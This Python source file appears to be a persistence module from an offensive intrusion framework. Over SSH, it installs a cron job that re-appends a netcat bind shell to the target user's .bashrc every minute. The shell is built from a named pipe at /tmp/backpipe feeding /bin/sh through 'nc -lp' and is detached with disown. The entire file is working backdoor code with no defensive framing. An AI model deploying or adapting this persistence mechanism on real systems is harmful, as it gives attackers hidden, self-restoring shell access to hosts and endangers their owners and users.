import logging

from polarity_server.persistence.base import BasePersistence
from polarity_server.shell_deployment import SSHShell


class CronPersistence(BasePersistence):

    OS_FAMILY = ["Linux"]
    PORT = 22

    def install(self):
        if self._host.os_info.os_family in self.OS_FAMILY:
            ssh_shell = SSHShell(self._host, self._user)
            if not ssh_shell.create_connection():
                return False

            command = "mkdir -p /home/{}/.cron".format(self._user.username)
            ssh_shell.send_command(command)

            command = "echo \"*/1 * * * * echo \\\"cp -f /etc/skel/.bashrc /home/{}/.bashrc 2>/dev/null; " \
                      "NC=\\\`which nc\\\` && mknod /tmp/backpipe p 2>/dev/null; " \
                      "/bin/sh 0</tmp/backpipe | \\\$NC -lp {} 1>/tmp/backpipe &disown\\\" " \
                      ">> /home/{}/.bashrc\" " \
                      ">> /home/{}/.cron/.crontab".format(self._user.username,
                                                         self._listen_port,
                                                         self._user.username,
                                                         self._user.username)
            ssh_shell.send_command(command)

            command = "crontab /home/{}/.cron/.crontab".format(self._user.username)
            ssh_shell.send_command(command)

            ssh_shell.close_connection()

            logging.info("Installed cron persistence on {}@{}"
                         .format(self._user.username, self._host.ip_address))

            return True
        else:
            return False
